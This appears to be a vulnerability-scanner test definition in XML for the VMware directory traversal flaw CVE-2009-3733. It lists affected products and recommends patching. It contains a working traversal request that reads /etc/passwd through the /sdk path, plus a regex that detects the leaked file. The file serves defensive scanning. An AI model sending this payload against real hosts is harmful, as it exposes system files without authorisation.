<?xml version="1.0" encoding="utf-8"?>
<WebApplicationTest>
	<TestDescription name="VMware directory traversal and privilege escalation vulnerabilities" version="1.3" released="20100303" updated="20140307" protocol="HTTP" mayproxy="true" affects="server" severity="high" alert="success" type="Validation">
		<WASPDescription BindAlertToFile="0" CrawlerProcessingMode="ParseOnly" TargetFormat="" Target="" ModuleName="" Request="" Response="" FullResponse="" DetailsFormat="" Details="" AuthType="0" AuthName="" AuthPass="" CompInfo="" FolowRedirection="true" DetaliedInformation="" SendCookies="true" AlertTags="directory_traversal,known_vulnerabilities,missing_update" HasPrecondition="false" SendAuth="true" ValidateSession="false" CVE="CVE-2009-2267,CVE-2009-3733" CWE="CWE-22" CVSSVer="2.0" CVSSScore="6.9" CVSSDescr="AV:L/AC:M/Au:N/C:C/I:C/A:C/E:U/RL:OF/RC:C" CVSSScoreTemp="5.2" CVSSScoreEnv="5.2" CVSS3Descr="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"></WASPDescription>
		<Copyright></Copyright>
		<Description>Two vulnerabilities have been identified in various VMware products, which could be exploited by attackers or malicious users to disclose sensitive information or gain elevated privileges.  The first issue is caused due to an improper setting of the exception code on page faults on guest operating systems, which could allow malicious users to gain elevated privileges on a guest OS. The second vulnerability is caused by an unspecified input validation error, which could allow attackers with access to the network on which the host resides to download any file from the host system via directory traversal attacks
[break][break]
The following programs are vulnerable.
[break]
[ul]
[li]VMware Workstation version 6.5.2 and prior[/li]
[li]VMware Player version 2.5.2 and prior[/li]
[li]VMware ACE version 2.5.2 and prior[/li]
[li]VMware Server version 2.0.1 and prior[/li]
[li]VMware Server version 1.0.9 and prior[/li]
[li]VMware Fusion version 2.0.5 and prior[/li]
[li]VMware ESXi version 4.0[/li]
[li]VMware ESXi version 3.5[/li]
[li]VMware ESX version 4.0[/li]
[li]VMware ESX version 3.5[/li]
[li]VMware ESX version 3.0.3[/li]
[li]VMware ESX version 2.5.5[/li]
[ul]</Description>
		<ApplicableTo>
			<Platform>
				<OS>All</OS>
				<Arch>i386</Arch>
			</Platform>
			<WebServer>All</WebServer>
			<ApplicationServer>All</ApplicationServer>
		</ApplicableTo>
		<TriggerOn event="scheme_host_port">
			<Match type="regex">.*</Match>
		</TriggerOn>
		<Impact>By exploiting directory traversal vulnerabilities, attackers step out of the root directory and access files in other directories. As a result, attackers might view restricted files or execute commands, leading to a full compromise of the Web server.</Impact>
		<Recommendation>Apply patches or upgrade to fixed versions.</Recommendation>
		<Reference database="CVE-2009-3733" URL="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3733"></Reference>
		<Reference database="VMware hosted products and ESX patches resolve two security issues" URL="http://www.vmware.com/security/advisories/VMSA-2009-0015.html"></Reference>
	</TestDescription>
	<Connection scheme="${scheme}" host="${host}" port="${port}">
		<Step name="testfile">
			<Request>
				<MessageHeader>
					<Method>GET</Method>
					<URI>${scheme}://${host}:${port}${path}/sdk/../../../../../../../../../../../../../etc/passwd</URI>
					<Version>HTTP/1.0</Version>
				</MessageHeader>
				<MessageBody>
					<Separator></Separator>
				</MessageBody>
			</Request>
			<Response>
				<SetVariable name="ResponseCode" type="string">
					<Description>The HTTP Response Code</Description>
					<Source source="status">^.*\s(\d\d\d)\s</Source>
				</SetVariable>
				<SetVariable name="FullBody" type="string">
					<Description>The HTTP Response Code</Description>
					<Source source="body">^(.*)$</Source>
				</SetVariable>
				<SetVariable name="redir302" type="string">
					<Description>Check to see if we are being redirected to another page</Description>
					<Source source="header">^Location: (.*)$</Source>
				</SetVariable>
				<SetVariable name="DT" type="string">
					<Description>set the description here</Description>
					<Source source="body">(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3}</Source>
				</SetVariable>
			</Response>
			<TestCriteria type="success">
				<Compare variable="${ResponseCode}" test="eq">
					<Value>200</Value>
					<Compare variable="${IsCustom404}" test="eq">
						<Value>false</Value>
						<Compare variable="${DT}" test="neq">
							<Value></Value>
						</Compare>
					</Compare>
				</Compare>
			</TestCriteria>
			<TestCriteria type="failure">
				<Compare variable="${ResponseCode}" test="eq">
					<Value>404</Value>
				</Compare>
			</TestCriteria>
			<TestCriteria type="failure">
				<ErrorMessage>This test was redirected to '${redir302}'. The program that generated this test does not know how to handle 302 responses. Unfortunately, they are quite common in the Microsoft arena. Please update the generator, and rebuild these tests</ErrorMessage>
				<Compare variable="${ResponseCode}" test="eq">
					<Value>302</Value>
				</Compare>
			</TestCriteria>
			<TestCriteria type="failure">
				<ErrorMessage>This message indicates a failure to properly execute the test, or an unhandled HTTP response. Please investigate further, and modify this test before re-executing it. The server returned ${ResponseCode}</ErrorMessage>
				<Compare variable="${ResponseCode}" test="neq">
					<Value>200</Value>
				</Compare>
			</TestCriteria>
		</Step>
	</Connection>
	<Variable name="file" type="string">
		<Description>Affected site file</Description>
		<Item encoding="Text">test</Item>
	</Variable>
</WebApplicationTest>